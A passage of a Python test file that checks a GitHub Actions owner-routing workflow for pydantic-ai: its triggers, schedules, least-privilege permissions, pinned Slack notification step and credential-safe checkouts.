    monkeypatch.setattr(sys, 'argv', ['semantic_owner_router.py', 'select'])
    monkeypatch.setenv('GITHUB_TOKEN', 'token')

    assert router.main() == 1
    assert capsys.readouterr().err == 'owner routing failed: HTTPError 403\n'


def test_workflow_is_notification_first_and_least_privilege():
    workflow_path = Path(__file__).parents[1] / 'workflows' / 'pydantic-ai-owner-routing.yml'
    workflow = yaml.safe_load(workflow_path.read_text(encoding='utf-8'))
    jobs = workflow['jobs']

    assert set(workflow[True]) == {'schedule', 'workflow_dispatch', 'workflow_call'}
    assert [entry['cron'] for entry in workflow[True]['schedule']] == ['25 */6 * * *', '40 7 * * *']
    assert set(workflow[True]['workflow_call']['inputs']) == {'community_recovery'}
    assert jobs['route']['needs'] == 'select'
    assert jobs['select']['permissions'] == {
        'contents': 'read',
        'issues': 'read',
        'pull-requests': 'read',
    }
    assert jobs['route']['permissions'] == {
        'contents': 'read',
        'issues': 'write',
        'pull-requests': 'write',
    }
    assert jobs['route']['strategy'] == {
        'fail-fast': False,
        'max-parallel': 1,
        'matrix': {'route': '${{ fromJSON(needs.select.outputs.routes) }}'},
    }
    assert jobs['route']['concurrency']['group'] == 'semantic-owner-${{ github.repository }}-${{ matrix.route.number }}'
    prepare, notify, assign = jobs['route']['steps'][1:]
    select_step = jobs['select']['steps'][1]
    assert set(select_step['env']) == {'GITHUB_TOKEN', 'ROUTING_COMMUNITY_RECOVERY'}
    assert select_step['env']['ROUTING_COMMUNITY_RECOVERY'] == (
        "${{ github.event.schedule == '40 7 * * *' || inputs.community_recovery }}"
    )
    assert prepare['id'] == 'prepare'
    assert prepare['env']['ROUTE_NUMBER'] == '${{ matrix.route.number }}'
    assert prepare['env']['ROUTE_OWNER'] == '${{ matrix.route.owner }}'
    assert prepare['env']['ROUTE_EVIDENCE'] == '${{ matrix.route.evidence }}'
    assert notify['uses'] == 'slackapi/slack-github-action@45a88b9581bfab2566dc881e2cd66d334e621e2c'
    assert notify['with']['payload'] == '${{ steps.prepare.outputs.slack_payload }}'
    assert notify['with']['errors'] is True
    assert assign['if'] == "steps.prepare.outputs.should_notify == 'true'"
    assert 'PYDANTIC_AI_TRIAGE_SLACK_WEBHOOK_URL' not in assign['env']
    assert jobs['alert']['needs'] == ['select', 'route']
    assert jobs['alert']['permissions'] == {}
    assert "contains(needs.*.result, 'failure')" in jobs['alert']['if']
    assert jobs['alert']['steps'][0]['with']['errors'] is True
    assert '<!channel>' not in jobs['alert']['steps'][0]['with']['payload']
    # Reusable jobs must consume the explicitly passed workflow_call secret.
    # A job environment can shadow it with a caller-repository environment secret.
    assert 'environment' not in jobs['route']
    assert 'environment' not in jobs['alert']


def test_every_workflow_checkout_uses_the_defining_workflow_identity():
    workflow_path = Path(__file__).parents[1] / 'workflows' / 'pydantic-ai-owner-routing.yml'
    workflow = yaml.safe_load(workflow_path.read_text(encoding='utf-8'))

    checkouts = [
        step
        for job in workflow['jobs'].values()
        for step in job['steps']
        if str(step.get('uses', '')).startswith('actions/checkout@')
    ]
    assert len(checkouts) == 2
    assert all(step['with']['repository'] == '${{ job.workflow_repository }}' for step in checkouts)
    assert all(step['with']['ref'] == '${{ job.workflow_sha }}' for step in checkouts)
    assert all(step['with']['persist-credentials'] is False for step in checkouts)
